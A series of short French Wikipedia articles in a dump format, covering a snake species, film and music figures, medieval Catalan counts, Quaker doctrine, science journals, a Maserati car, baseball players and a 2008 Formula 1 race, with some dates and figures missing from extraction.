Cette espèce se rencontre en Birmanie, à l'île Maurice, en Inde, au Népal, au Pakistan et au Sri Lanka. Elle a été introduite sur l'île de La Réunion, où elle est avec "Ramphotyphlops braminus" l'une des deux espèces de serpents présente.
Description.
"Lycodon aulicus" mesure en moyenne dont pour la queue ; les femelles étant généralement plus grandes que les mâles. Sa coloration varie en fonction de son origine géographique. Son dos est brun ou brun grisâtre soit uniforme soit avec une réticulation ou des bandes transversales blanches, et avec ou sans collier blanc.
C'est un serpent nocturne qui se nourrit de lézards , souris et d'amphibiens. Les femelles sont ovipares et pondent de 4 à 11 œufs.

</doc>
<doc id="3215275" url="https://fr.wikipedia.org/wiki?curid=3215275" title="Tim Kincaid">
Tim Kincaid

Tim Kincaid est un réalisateur, scénariste et producteur de cinéma américain né le à Santa Barbara. Il a réalisé la plupart de ses films sous le pseudonyme de Joe Gage.
Biographie.
Né en Californie, il apparaît au cinéma comme acteur en 1971 dans le film "Quadroon" de Jack Weis. Il fait ensuite ses débuts de réalisateur en 1973 avec "The Female Response", un film érotique lesbien. Il joue en 1975 sous le nom de Joe Gage dans un film pornographique gay, "Morning, Noon and Night" de Nick Elliot.
Entre 1976 et 1979, il réalise une trilogie de films pornographiques gays, avec Nick Elliot à la photographie pour les deux premiers. Ces trois films, "Kansas City Trucking Co.", "El Paso Wrecking Corp." et "L.A. Tool and Die", sont considérés comme des classiques du genre. Sous le nom de Mac Larson, il réalise d'autres films pornographiques moins ambitieux pour P.M. Production jusqu'en 1983. 
Ensuite, il épouse Cynthia De Paula, avec qui il a deux enfants. En 1986, il sort des films non pornographiques de série Z, produits par sa femme, sous son le nom de Tim Kincaid : un film de prison pour femmes, "Bad Girls' Dormitory", et deux films de science-fiction : le post-apocalyptique "Robot Holocaust", et le film d'horreur extraterrestre "Breeders". Il en tourne quelques autres jusqu'en 1989, avec la comédie noire "Morte mais pas trop" avec Carrie Fisher.
Il publie deux romans d'amour : "Today, Tomorrow, And Always" (1996) et "Never Let Me Go" (1998).
Il reprend sa carrière pornographique gay en 2001 sous son pseudonyme de Joe Gage pour Men of Odyssey avec "Tulsa County Line". Il débute aussi la série "Joe Gage Sex Files" pour MSR Videos. Son contrat avec le studio Titan Media inaugure le renouveau d'une carrière prolifique de réalisateur pornographique gay chez eux. Il poursuit en parallèle sa série "Joe Gage Sex Files" chez D/G Mutual Media puis Dragon Media. Il déclare rechercher une représentation réaliste de la pornographie, et préfère montrer l'homosexualité dans un contexte de camaraderie que dans un contexte amoureux.
En 2005, il joue un rôle non sexuel dans "Beyond Perfect" de Jerry Douglas.
En 2014, Titan Media ouvre un site entièrement consacré aux films de Joe Gage.

</doc>
<doc id="3215279" url="https://fr.wikipedia.org/wiki?curid=3215279" title="ITTF">
ITTF



</doc>
<doc id="3215281" url="https://fr.wikipedia.org/wiki?curid=3215281" title="Jean-Paul Richter (historien de l'art)">
Jean-Paul Richter (historien de l'art)

Jean-Paul Richter est un historien de l'art allemand, né à Dresde le et mort à Lugano le , à qui on doit la première compilation des écrits de Léonard de Vinci, "The Literary Works of Leonardo da Vinci Compiled and Edited from The Original Manuscipts", parue en 1883.
Biographie.
Jean-Paul Richter fit d’abord des études en théologie avant de s‘intéresser à l'histoire de l‘art. Sa rencontre avec Giovanni Morelli en 1876 fut déterminante. Morelli vit en lui le disciple capable de perpétuer la méthode d’attribution qu'il avait élaboré en se fondant sur l’examen des détails d’un tableau. La confiance entre les deux hommes dura jusqu’à la mort de Morelli en 1891. En 1877, Richter quitta l’Allemagne pour s’installer à Londres. Morelli fournit à son élève les lettres de recommandation nécessaires, tout comme, quelques années plus tard, Richter devait lui recommander le jeune Bernard Berenson.
Richter aida l’industriel Ludwig Mond à constituer sa collection de tableaux de maîtres italiens qui fut léguée plus tard à la National Gallery de Londres. Il rédigea le catalogue des peintures italienne de cette même National Gallery. En 1883, il publia l’œuvre pour laquelle il est le plus connu, son édition des écrits de Léonard de Vinci, "The Literary Works of Leonardo da Vinci Compiled and Edited from The Original Manuscipts". Il ne s’agit pas d’une tentative (comme celle de Raphaël Trichet du Fresne en 1651) pour reconstituer le "Traité de la Peinture" de Léonard de Vinci, mais d’une compilation regroupant tous les thèmes abordés par Léonard dans ses manuscrits, aussi bien la perspective ou la théorie des couleurs que la géologie ou les maximes philosophiques, méthode que reprit Mc Curdy pour ses "Notebooks", en 1938.

</doc>
<doc id="3215282" url="https://fr.wikipedia.org/wiki?curid=3215282" title="Raymond Borrell de Barcelone">
Raymond Borrell de Barcelone

Raimond Borell de Barcelone (né le - mort à Barcelone le ) est un comte de Barcelone qui porta également les titres de comte de Gérone et d'Osona.
Il passa la plus grande partie de son règne à combattre les califes de Cordoue et profita avantageusement de la déliquescence du califat pour s'enrichir et renforcer son pouvoir.
Biographie.
Jeunesse.
Raimond Borell naît le . Il est le fils du comte de Barcelone, , et de son épouse, Letgarde de Rouergue, fille du comte de Rouergue et de Toulouse, . En 986, il est majeur et son père l'associe à l'exercice du pouvoir comtal. Dès le début de l'année 992, son père semble se retirer du pouvoir et il en assume seul la charge.
Règne.
Raimond Borrell hérite des domaines de son père à la mort de celui-ci, en . Il se cherche rapidement une épouse et se marie en 993 avec Ermessende de Carcassonne, fille du comte de Carcassonne et de Razès, .
En 1002, accompagné par l'évêque de Vic Arnulf, il se rend à Rome pour rencontrer le pape . Un des objectifs est de résoudre le problème lié au monastère Saint-Benoît de Bages.
En 1001 ou 1002, il doit combattre une incursion du vizir du califat de Cordoue, Almanzor, qui détruit complètement Manresa, qui reste ruinée pour une vingtaine d'années. À la mort d'Almanzor, Raimond Borrell s'associe à son cousin, le comte d'Urgell . En 1003, ils montent une expédition contre Lérida avec l'aide de troupes venues d'autres comtés, comme le Roussillon. Vainqueurs à la bataille d'Albesa, ils obtiennent un butin important. Mais l'expédition reste inefficace d'un point de vue politique, car le fils d'Almanzor, Abd al-Malik poursuit les opérations de son père. Il pénètre avec des troupes musulmanes, mozarabes et des alliés de la Castille et du León, dans le comté d'Urgell, et s'empare de Meia. Pendant ce temps, Wadih, vaincu à Albesa, s'empare du château de Montmagastre et exécute l'ensemble de la garnison, puis se dirige sur Castellolí. Abd al-Malik et Wadih, pressés par l'hiver qui arrive, décident finalement de se retirer, non sans prendre captifs à Lérida et détruire plusieurs châteaux qui menaçaient la Marche.
À la mort d'Abd al-Malik, en 1008, le califat de Cordoue commence à se désagréger. Deux prétendants omeyyades s'affrontent : , le fils du calife , et Sulayman al-Mustain, fils d'al-Hakam, un petit-fils du calife . Sulayman al-Mustain, avec le soutien des Berbères et des Castillans, s'installe à Cordoue en 1009. demande alors à Wadih de négocier une alliance avec les comtes catalans. Celle-ci est conclue lors d'une grande assemblée qui se tient en à Barcelone afin d'engager les travaux de réfection de la cathédrale, et à laquelle participent les évêques de Barcelone, d'Elne, de Gérone, d'Osone et d'Urgell, ainsi que les comtes de Raimond Borrell de Barcelone, d'Urgell et Bernard Taillefer de Besalú. En 1010, les comtes catalans constituent une expédition contre Sulayman al-Mustain. Le sac de la ville de Cordoue procure d'importantes richesses aux comtes catalans vainqueurs.
En 1011, à la mort du comte d'Urgell , la tutelle du jeune est confiée à Raimond Borrell. Celui-ci se rend la même année à un concile provincial, dirigé par l'archevêque de Narbonne, réuni à la Seu d'Urgell, afin de restaurer la cathédrale d'Urgell. La présence de tous les évêques de la province de Narbonne et de plusieurs comtes catalans, en particulier et Guillem de Ribagorce est l'occasion pour Raimond Borrell d'asseoir sa prééminence sur les autres personnages, mais aussi de manifester l'unité des comtés de la région.
En 1015-1016, Raimond Borell mène une nouvelle offensive contre Sulayman al-Mustain, qui a repris le pouvoir à Cordoue. Il remonte les vallées du Sègre et de l'Ebre. Il passe alors une alliance avec , qui est en train de se constituer un royaume indépendant autour de Saragosse. Il se rend d'ailleurs à la cour de celui-ci, à Saragosse, avec le comte de Castille . C'est à ce moment qu'il convient du mariage de son fils, Bérenger-Raimond, avec la fille de , Sancie.
En 1017, Raimond Borell organise une nouvelle offensive aux côtés de son nouvel allié, , afin de combattre Abd al-Rahman, un omeyyade qui cherche à reprendre le pouvoir. Mais Raimond Borell doit finalement renoncer à son expédition et rentrer à Barcelone.
Décès.
Raimond Borell arrive en Catalogne le . Il meurt à Barcelone le suivant. Il est enterré dans le cloître de la cathédrale de Barcelone, dont il avait soutenu la reconstruction et pour laquelle il fait une importante donation par testament. L'abbé Oliba lui dédie un chant funèbre, où il lui attribue le comportement d'un roi.
Par testament, Raimond Borell dispose que sa femme, Ermessende de Carcassonne, est chargée de veiller sur leur fils et d'être sa tutrice.
Mariages et enfants.
En 993, Raimond Borell épouse Ermessende de Carcassonne. Elle était la fille du comte de Carcassonne, , et de son épouse, Adélaïde de Melgueil. Ils ont ensemble plusieurs enfants :

</doc>
<doc id="3215283" url="https://fr.wikipedia.org/wiki?curid=3215283" title="Déclaration de Richmond">
Déclaration de Richmond

La Déclaration de Richmond est l'expression d'une différence doctrinale au sein de la Société religieuse des Amis (quakers), à la fin du .
Cette déclaration de a été soutenue par 95 quakers, représentant douze Assemblées annuelles, lors d'une conférence à Richmond (Indiana). C'était une déclaration de foi, et bien que les quakers n'aient pas de dogmes ou de credo, elle a été utilisée depuis lors comme une norme par les quakers dits « orthodoxes » ou « évangéliques » (aujourd'hui réciproquement représentés par les organisations faîtières "Friends United Meeting" et "Evangelical Friends International"). 
La Déclaration de Richmond a été réaffirmée par l'assemblée générale de "Friends United Meeting" en .
Entre autres affirmations, la Déclaration de Richmond dit que les Saintes Écritures ont une plus grande autorité que la lumière intérieure. De nombreuses Assemblées quakers n'approuvent pas cette priorité donnée à la Bible, qui reste une manière de définir la branche dite « orthodoxe » du quakerisme.

</doc>
<doc id="3215287" url="https://fr.wikipedia.org/wiki?curid=3215287" title="Andrea Anders">
Andrea Anders

Andrea Anders, née le à Madison (Wisconsin) est une actrice américaine.
Biographie.
Andrea Anders est née le à Madison (Wisconsin).
Elle a un frère, Sean Anders, réalisateur et scénariste. et une sœur, Torri Anders.
Carrière.
Elle débute au cinéma en 2004 dans "Et l'homme créa la femme", aux côtés de Nicole Kidman.
De 2004 à 2006, elle joue dans la sitcom "Joey", spin-off de la série "Friends". Elle enchaîne avec "La Classe" en 2006 et 2007.
De 2010 à 2011, elle à l'affiche de la série "Mr. Sunshine", aux côtés de Matthew Perry.
Elle joue sous la direction de son frère, Sean Anders dans ' (2005), "Sex Drive" (2008), "Very Bad Dads 2" (2017) et "Apprentis parents" (2018) et ' (2022).
Voix françaises.
En France, Véronique Picciotto est la voix française régulière de Sherri Saum depuis la série "Joey" en 2004.

</doc>
<doc id="3215288" url="https://fr.wikipedia.org/wiki?curid=3215288" title="PLOS Medicine">
PLOS Medicine

PLOS Medicine est une revue scientifique publiée mensuellement par la depuis le . Elle couvre tous les domaines de la santé humaine, de la médecine et de la biologie.
Historique.
PLOS, une organisation à but non lucratif, diffuse des publications scientifiques selon des termes permettant un accès ouvert. L'ensemble du contenu de "PLOS Medicine" est publié sous les termes de la licence Creative Commons "by-attribution". Pour financer la revue, le modèle économique est de faire payer aux auteurs les frais de publication.
En plus d'articles de recherche, "PLOS Medicine" publie des lettres électroniques dans lesquelles les lecteurs peuvent apporter leurs commentaires sur les articles. En 2014, le facteur d'impact de "PLOS Medicine" est de 14,429.

</doc>
<doc id="3215289" url="https://fr.wikipedia.org/wiki?curid=3215289" title="Championnats d'Afrique d'escrime 2008">
Championnats d'Afrique d'escrime 2008

Les championnats d’Afrique d'escrime 2008 se sont disputés à Casablanca au Maroc entre le et le . La compétition organisée par la Fédération royale marocaine d'escrime, sous l'égide de la Confédération africaine d'escrime a vu s'affronter des tireurs des différents pays africains lors de 12 épreuves différentes.
Seuls cinq pays placent un de leurs tireurs sur un podium, l'Égypte, la Tunisie, l'Algérie, le Maroc et le Sénégal.
Avec six titres sur douze, l'Égypte est la grande triomphatrice de ces championnats.

</doc>
<doc id="3215293" url="https://fr.wikipedia.org/wiki?curid=3215293" title="Tunisie aux Jeux paralympiques d'été de 2004">
Tunisie aux Jeux paralympiques d'été de 2004

La Tunisie a participé aux Jeux paralympiques d'été de 2004 à Athènes (Grèce). Elle termine avec 18 médailles.

</doc>
<doc id="3215295" url="https://fr.wikipedia.org/wiki?curid=3215295" title="Roger Ier de Carcassonne">
Roger Ier de Carcassonne

 de Carcassonne, dit aussi "Roger le Vieux", fut comte de Carcassonne, du Razès, de Couserans, de Comminges et seigneur de Foix, approximativement de la fin des années 950 à 1012.
Biographie.
Roger est le fils d'un comte Arnaud et probablement de son épouse Arsinde. On suppose que cet Arnaud pourrait être issu de l'entourage des ducs d'Aquitaine, mais il n'existe aucune certitude à ce propos. Arsinde appartiendrait à la famille comtale de Toulouse.
Dominant les comtés du Carcassès et du Razès, il étendit notablement ses possessions sur tout le sud du comté de Toulouse (partie laissée en héritage à son fils Bernard Roger, à l'origine du comté de Foix), le tiers du comté de Comminges, le Volvestre, en Couserans, sur le Quercorb ainsi que sur Minerve et l'abbaye de Caunes. Il fut en conflit avec le comte de Toulouse et le comte de Cerdagne et de Besalú Oliba Cabreta, contre lesquels il remporta deux victoires militaires, bien qu'il dût abandonner définitivement à ce dernier sa suzeraineté sur tout le sud du comté de Razès : Pays de Sault, Donezan, Capcir et Fenouillèdes.
Enfants.
De son mariage avec Adélaïde de Melgueil, fille de Bernard, comte de Melgueil, et Senegonde de Rouergue, attestée à ses côtés pour la première fois en , il eut au moins quatre enfants :

</doc>
<doc id="3215298" url="https://fr.wikipedia.org/wiki?curid=3215298" title="Arrondissement de Leyde">
Arrondissement de Leyde

L'arrondissement de Leyde (en néerlandais : ) était une subdivision administrative française du département des Bouches-de-la-Meuse du Premier Empire créée le et supprimée le .
Géographie.
Cantons.
L'arrondissement de Leyde comprenait les cantons suivants : 

</doc>
<doc id="3215304" url="https://fr.wikipedia.org/wiki?curid=3215304" title="Song Seung-jun">
Song Seung-jun

Song Seung-Jun (né le , Corée du Sud) est un joueur coréen de baseball qui joue avec les Lotte Giants de Pusan dans la ligue sud-coréenne de baseball.
Il a obtenu la médaille d'or de baseball lors des jeux olympiques 2008 à Pékin.

</doc>
<doc id="3215310" url="https://fr.wikipedia.org/wiki?curid=3215310" title="Sensemaya">
Sensemaya



</doc>
<doc id="3215312" url="https://fr.wikipedia.org/wiki?curid=3215312" title="Maserati Ghibli I">
Maserati Ghibli I

La Maserati Ghibli est une automobile de grand tourisme du constructeur automobile italien Maserati. Elle doit son nom au ghibli, un vent tempétueux du désert égyptien. Présentée au salon de Turin 1966, elle sera produite en série et commercialisée à partir de 1967 et ce jusqu'en 1973. Son code usine est AM 115. Elle sera remplacée à cette date par la Maserati Khamsin.
Concurrente directe des prestigieuses Ferrari Daytona et Lamborghini Miura, la Maserati Ghibli est « un chef-d'œuvre esthétique, de puissance et de souplesse » reconnu par bon nombre comme l'une des réalisations italiennes les plus réussies des années 1960.
Genèse.
La Maserati Ghibli est dévoilée en première mondiale sur le stand Ghia du Salon de l'automobile de Turin en novembre 1966, où elle partage la vedette avec les De Tomaso Mangusta et Pampero ainsi que la Fiat 850 Vanessa toutes quatre dessinées par Giorgetto Giugiaro. Elle y est très bien accueillie, aussi bien par la presse que par le public.
À l'image des Ferrari Daytona et Lamborghini Miura, la Ghibli est, malgré un empattement généreux de et une longueur de , une stricte berlinette deux places. Un an après son lancement, elle est déclinée en version décapotable. Alors que coupés seront produits, seul 125 cabriolets verront le jour.
Moteur et performances.
La Maserati Ghibli est dans un premier temps propulsée par un moteur V8 de à quatre arbres à cames en tête (type mines : 4700 GT). Entièrement réalisé en aluminium, il développe une puissance de et un couple de à . En ce qui concerne l'alimentation, Giulio Alfieri conserve les quatre carburateurs Weber double corps délaissant l'injection indirecte Lucas. Dès 1968, un peut être monté sur demande spéciale. Quelques exemplaires (six ?) en seront équipés. C'est en 1970, que ce apparaîtra officiellement au catalogue. Quelques chevaux supplémentaires () mais surtout plus de couple ( à ) pour ce moteur qui n'en manquait déjà pas. Elles furent commercialisés sous l'appelation Ghibli SS (type mines : 5000 SS) et équipées de la direction assistée.
Associée à une boîte manuelle ZF à , sa vitesse de pointe exploitable est d'environ . Au-delà de cette vitesse (le constructeur annonce …), la stabilité devient précaire, la carrosserie n'ayant pas fait l'objet d'une étude aérodynamique spécifique. Une boîte Borg-Warner à trois rapports automatiques est disponible en option .
Châssis et suspensions.
La mécanique de la Ghibli repose sur un châssis tubulaire considéré comme « quelque peu archaïque », associé à un pont arrière oscillant à ressorts à lames. Si les "muscle cars" de l'époque utilisent également ce type de suspensions, les européennes privilégient habituellement des triangles superposés. Malgré cela, les essais de l'époque confirment que sa tenue de route équivalait à celle de ses concurrentes, et qu'elle était plus facile et reposante à conduire. Une vraie GT à hautes performances.
Design.
Le dessin de la carrosserie "fastback" de la Maserati Ghibli est le résultat du travail de Giorgetto Giugiaro, pour le compte de Ghia. Ce dernier a en effet quitté la carrosserie Bertone en 1965 pour rejoindre Ghia dans le but d'en rajeunir l'image.
Impressionnant par son long capot, la Ghibli est « d'une merveilleuse pureté », impression renforcée par les lignes droites du pavillon et du plan arrière. Elle est d'ailleurs, selon l'ouvrage "Voitures de légende", la dernière des vraies GT italiennes.
L'utilisation d'une lubrification du moteur par carter sec lui octroie une silhouette particulièrement basse. Le moteur ainsi moins haut, sa garde au toit n'est que de , favorisant ainsi le « dynamisme inouï de ses formes ».

</doc>
<doc id="3215314" url="https://fr.wikipedia.org/wiki?curid=3215314" title="PLOS Genetics">
PLOS Genetics

PLOS (abrégé "PLOS Genet.") est une revue scientifique à comité de lecture couvrant tous les domaines de la génétique et de la génomique humaines, animales et végétales. Elle est éditée mensuellement par la "". En plus d'articles de recherche, "PLOS " publie des lettres électroniques dans lesquelles les lecteurs peuvent apporter leurs commentaires sur les articles.
D'après le "", le facteur d'impact de ce journal était de 7,528 en 2014. Actuellement, le directeur de publication est Gregory S. Barsh (Université Stanford, États-Unis).
"PLOS" est une organisation à but non lucratif qui diffuse des publications scientifiques selon des termes permettant un libre accès. L'ensemble du contenu de "PLOS Genetics" est publié sous les termes de la licence Creative Commons "by-attribution". Pour financer la revue, le modèle économique est de faire payer aux auteurs les frais de publication.

</doc>
<doc id="3215315" url="https://fr.wikipedia.org/wiki?curid=3215315" title="Crioulo">
Crioulo



</doc>
<doc id="3215317" url="https://fr.wikipedia.org/wiki?curid=3215317" title="Bérenger-Raimond Ier de Barcelone">
Bérenger-Raimond Ier de Barcelone

 de Barcelone (né vers 1005 - mort à Barcelone le ), surnommé "le Courbé", est un comte de Barcelone qui porte également les titres de comte de Gérone et d'Osona.
Il reste dans la mémoire comme un homme juste, qui maintint la paix dans ses comtés et fit le voyage de Rome pour rencontrer le pape, mais aussi comme un homme un peu indécis qui, confronté à la baisse du pouvoir comtal, ne sut pas réagir assez efficacement.
Biographie.
Jeunesse.
Bérenger-Raimond naît entre 1004 et 1006. Il est le fils aîné du comte de Barcelone Raimond Borell et de son épouse, Ermessende, fille du comte de Carcassonne, . Il est ainsi apparenté aux plus puissantes familles du Midi du royaume de France. 
En 1016 sont conclues, à Saragosse, qui fait alors partie du puissant royaume de Pampelune, les noces de Bérenger-Raimond et de Sancie, fille du comte de Castille, , vassal du roi de Pampelune, . Le mariage est, sans doute, consommé avant 1021. 
Raimond Borell, avant de mourir, confie le pouvoir à son épouse, Ermessende, qui devient tutrice de durant sa minorité.
Règne.
La régence d'Ermessende de Carcassonne.
La comtesse Ermessende mène une politique ambitieuse et agressive contre les royaumes taïfas. En 1018, avec l'aide des troupes normandes de , elle impose un tribut à Mujahid al-Amiri, le roi taïfa de Dénia et des Baléares. 
À la suite d'un accord avec sa mère, qui ne veut pas le laisser assumer seul le pouvoir comtal, Bérenger-Raimond accède finalement à la majorité vers 1023 avec l'aide de son épouse, Sancie. Celle-ci lui donne d'ailleurs deux fils : Raimond-Bérenger, né en 1023, et Sanche (ou Sanche-Bérenger).
Les conflits.
 ne mène pas d'expédition majeure contre les royaumes taïfas et son règne n'est pas marqué par de nouvelles conquêtes, ce qui lui a valu d'être tenu en piètre estime par les chroniqueurs catalans tels que le rédacteur des "Gesta comitum barchinonensium". Il fait cependant plusieurs conquêtes dans la région de Cervera et dans la haute vallée du Gaià. Mais il doit également faire face à plusieurs invasions, en particulier dans la région d'Argençola.
La consolidation du pouvoir comtal.
Le comte s'occupe surtout de consolider ses possessions et la paix, alors qu'il est confronté à l'émiettement du pouvoir comtal de la mutation féodale. Pour cela, il s'entoure de bons conseillers, tels que l'abbé Oliba, promoteur de la réforme grégorienne devenu évêque de Vic en 1018. On retrouve dans son entourage la plupart des grands ecclésiastiques de son domaine, tels que l'évêque de Gérone, Pierre Roger de Carcassonne, et celui de Barcelone, Déodat. Il trouve le soutien de juristes comme le juge Pons Bofill et Gombaud de Besora, oncle de sa deuxième épouse.
En 1019, avec l'aide de l'abbé Oliba, il trouve un accord avec le comte d'Ampurias, . En 1023, il passe également des accords avec le comte de Besalu, , et celui de Cerdagne, . En 1027, il conclut un nouveau mariage avec Gisèle, fille du viguier de Balsareny, Sunifred de Lluçà. Alors qu'il rencontre des difficultés avec son cousin , le comte d'Urgell, depuis 1018, il obtient sa soumission et la reconnaissance de sa suzeraineté en 1028. Bérenger-Raimond entretient aussi de bonnes relations avec son ancien beau-frère, le roi de Pampelune . Il se rend à Pampelune en 1027 et en 1028 et, peut-être, à Saint-Jean de la Peña en 1030. 
Le comte s'occupe surtout du développement de ses terres. En 1025, il garantit aux habitants de Barcelone et à tous les possesseurs d'alleux la libre propriété de leurs terres, et surtout les relève de toute autre juridiction que la sienne. Il renforce ainsi son autorité au détriment des seigneurs locaux. Il soutient les marchands catalans et ordonne la frappe de nouveaux deniers d'argent et de billons blancs. Il confie aussi à l'orfèvre Bonhom la frappe de mancus d'or : on assiste à la reprise de la frappe de monnaies d'or pour la première fois dans la région, alors que l'Europe occidentale l'avait abandonné au profit exclusif de monnaies d'argent. 
Bérenger-Raimond soutient aussi la diffusion de la réforme grégorienne, avec l'appui de l'abbé Oliba. Le , il reconnaît les droits de l'abbaye de Ripoll sur la montagne de Montserrat, où est établi un monastère en 1025. Vers la fin de 1032, Bérenger-Raimond se rend à Rome, où il rencontre , afin de poursuivre la politique de son père Borell d'alliance avec les papes.
Décès.
Bérenger-Raimond meurt le . Dans son testament, rédigé plus tôt, le , il laisse à son fils aîné, Raimond-Bérenger, l'autorité sur ses frères avec le comté de Gérone et celui de Barcelone jusqu'au Llobregat, tandis que Sanche obtient les terres entre le Llobregat et la frontière avec les terres musulmanes, avec Olèrdola pour capitale. Guillaume reçoit quant à lui le comté d'Osona où il se rend avec sa mère, Gisèle. Enfin, il donne à sa mère, Ermessende, le rôle de tutrice de son fils aîné, Raimond-Bérenger, et de régente des trois comtés.
Mariages et enfants.
En 1021, Bérenger-Raimond épouse Sancie de Castille, dont le mariage avait été conclu à Saragosse en 1016. Elle était la deuxième fille du comte de Castille, et de son épouse, Urraque. Ils ont ensemble plusieurs enfants : 
En 1027, il épouse en secondes noces Gisèle de Lluça, fille de viguier de Balsareny -un descendant du comte de Barcelone Guifred le Velu- et de Ermessinde de Balsareni. Ils ont trois enfants ensemble :

</doc>
<doc id="3215319" url="https://fr.wikipedia.org/wiki?curid=3215319" title="69e division d'infanterie (France)">
69e division d'infanterie (France)

La d'infanterie est une division d'infanterie de l'armée de terre française qui a participé à la Première Guerre mondiale.
Première Guerre mondiale.
Composition.
Mobilisée dans les 2 et Régions.
Rattachements.
Affectation organique : 

</doc>
<doc id="3215321" url="https://fr.wikipedia.org/wiki?curid=3215321" title="Parc de Fleury-sur-Orne">
Parc de Fleury-sur-Orne

Le Parc de Fleury-sur-Orne (parc d'activités Normandika) est un centre commercial situé à Fleury-sur-Orne, près de Caen dans le département du Calvados et la région Normandie.
Description.
Le parc doit se développer sur de terrain. Les commerces s'implanteront sur et sont réservés aux activités tertiaires. Le parc de Fleury-sur-Orne est desservi par le périphérique sud de Caen qui communique vers l’autoroute A13 (autoroute de Normandie).
Enseignes et activités prévues.
La société Ikea signe un compromis de vente en , elle achète , en bordure du périphérique sud.
Le projet Ikea comporte quatre tranches, programmées pour une réalisation sur sept ans. Prévue sur 18 des , la première tranche comprend « un centre commercial avec l'enseigne Ikea et des enseignes liées à l'équipement de la maison, en grande majorité ». Surface de vente totale : . La deuxième tranche se compose d'un centre de loisirs, réalisé par le groupe Ikea. Il pourrait proposer par exemple une rivière artificielle, un karting, un mur d'escalade, etc.
En , la société annonce que seul le magasin devrait ouvrir, avec retard sur la date prévue, en ; les autres enseignes, au sein d'InterIkéa n'étant finalement prévues que pour l'horizon 2014.

</doc>
<doc id="3215324" url="https://fr.wikipedia.org/wiki?curid=3215324" title="Arrondissement de Rotterdam">
Arrondissement de Rotterdam

L'arrondissement de Rotterdam était une subdivision administrative française du département des Bouches-de-la-Meuse du Premier Empire créée le et supprimée le .
Géographie.
Cantons.
L'arrondissement de Rotterdam comprenait les cantons de : 

</doc>
<doc id="3215325" url="https://fr.wikipedia.org/wiki?curid=3215325" title="Shiri Maimon">
Shiri Maimon

Shiri Maimon (hébreu : שירי מימון) est une auteur-interprète, danseuse et comédienne israélienne née le à Haifa, Israël. Elle a été découverte en 2004 par la version israélienne de la Nouvelle Star, "Kokhav Nolad".
En 2013, Shiri devient l'un des quatre juges de la première saison de .
Biographie.
Enfance et jeunesse.
Shiri est née à Haïfa, en Israël et fut élevée à Kiryat Haïm. Elle est d'origine juive séfarade, son père étant d'origine syrienne et grecque et sa mère d'origine algerienne. Elle fait ses débuts à l'âge de dix ans, lors d'un festival de chant pour enfants. Elle rejoint l'Armée de défense d'Israël, où elle chante avec un groupe de soutien de la Force aérienne et spatiale israélienne. En 2001, elle apparaît dans un clip vidéo du groupe Teapacks. Plus tard, elle travaille un an et demi comme chanteuse et serveuse à Eilat. En 2003, elle auditionne pour Kokhav Nolad et arrive seconde du concours.
Carrière.
Elle sort son premier single, "Until You Understand Me" en 2004. Tout en travaillant sur son premier album, elle est présentatrice d'une émission télévisée pour enfants israélienne, "EXIT". 
En 2005, elle participe à Kdam "Eurovision", une compétition pré-Eurovision pour choisir celui ou celle qui représentera le pays. Elle n'était pas la favorite du concours, mais elle remporte la première place pour sa performance de "HaSheket SheNish'ar" ("Le silence qui reste"). 
Elle représente donc Israël pour le Concours Eurovision de la chanson 2005 à Kiev. Elle avait refusé au début l'idée que certaines parties de sa chanson doivent être chantées en anglais. Finalement, compte tenu du fait que les anciennes chansons représentées en langues étrangères n'avaient pas eu le succès escompté, elle décida de chanter la chanson moitié en hébreu et moitié en anglais. Elle termine quatrième sur 24 pays participants, avec un total de 154 points.

</doc>
<doc id="3215329" url="https://fr.wikipedia.org/wiki?curid=3215329" title="Yoon Suk-min">
Yoon Suk-min

Yoon Suk-min (né le à Guri en Corée du Sud) est un lanceur droitier des Orioles de Baltimore de la Ligue majeure de baseball.
Carrière.
International.
Il a obtenu la médaille de bronze de baseball lors des Jeux asiatiques de 2006 à Doha et la médaille d'or de baseball lors des Jeux olympiques 2008 à Beijing. Il s'aligne avec l'équipe de Corée du Sud aux Classiques mondiales de baseball de 2009 et 2013. La Corée du Sud perd la finale en 2009 contre le Japon mais Yoon ne joue pas dans cette rencontre.
Corée.
Suk-min Yoon évolue pour les Kia Tigers de Gwangju dans l'Organisation coréenne de baseball (KBO) de 2005 à 2013. En 9 saisons, il remporte 73 victoires contre 59 défaites dans la KBO, où il est principalement lanceur partant. Sa moyenne de points mérités se chiffre à 3,19 en manches lancées.
Il est joueur étoile de la KBO en 2008, 2009 et 2011. Cette saison 2011 est considérée sa meilleure : moyenne de points mérités de 2,45, 17 victoires et 5 défaites, 179 retraits sur des prises en 27 matchs. Il est nommé en 2011 joueur par excellence de la ligue en plus de gagner la triple couronne des lanceurs. Il est le meneur en KBO pour la moyenne de points mérités en 2008 et 2011. En 2011, il mène aussi la ligue pour les retraits sur des prises, les victoires et les matchs complets. En 2011 et 2012, il est le meneur de la ligue pour les blanchissages.
En 2013, il souffre d'une tendinite et évolue d'abord lanceur de relève pour les Tigers. Il maintient une moyenne de points mérités de 3,60 avec 7 sauvetages en 19 apparitions en relève cette année-là. En ajoutant ses matchs joués comme partant, il dispute au total 30 parties et affiche une moyenne de 4 points mérités alloués par match, avec 3 victoires et 6 défaites.
Ligue majeure de baseball.
Le , Yoon signe un contrat de 5,75 millions de dollars pour 3 ans avec les Orioles de Baltimore de la Ligue majeure de baseball. Yoon, qui a repoussé une offre plus lucrative des Tigers de la KBO, est le premier joueur coréen jamais mis sous contrat par les Orioles.

</doc>
<doc id="3215331" url="https://fr.wikipedia.org/wiki?curid=3215331" title="10,000 BC">
10,000 BC



</doc>
<doc id="3215341" url="https://fr.wikipedia.org/wiki?curid=3215341" title="Drapeau de la RSS du Turkmenistan">
Drapeau de la RSS du Turkmenistan



</doc>
<doc id="3215342" url="https://fr.wikipedia.org/wiki?curid=3215342" title="Grand Prix automobile de Belgique 2008">
Grand Prix automobile de Belgique 2008

Le Grand Prix automobile de Belgique 2008 (), disputé sur le circuit de Spa-Francorchamps le 7 septembre 2008, est la du championnat du monde de Formule 1 courue depuis 1950 et la treizième manche du championnat 2008.
Course.
Déroulement de l'épreuve.
Lewis Hamilton ne tire pas longtemps avantage de sa pole position puisqu'il part en tête-à-queue à l'épingle de la Source dès le second tour, laissant le leadership à Kimi Räikkönen. Au départ, l'empilement à l'épingle pénalise Heikki Kovalainen, Jarno Trulli et Nick Heidfeld tandis que Felipe Massa est troisième, suivi par Fernando Alonso et Sébastien Bourdais.
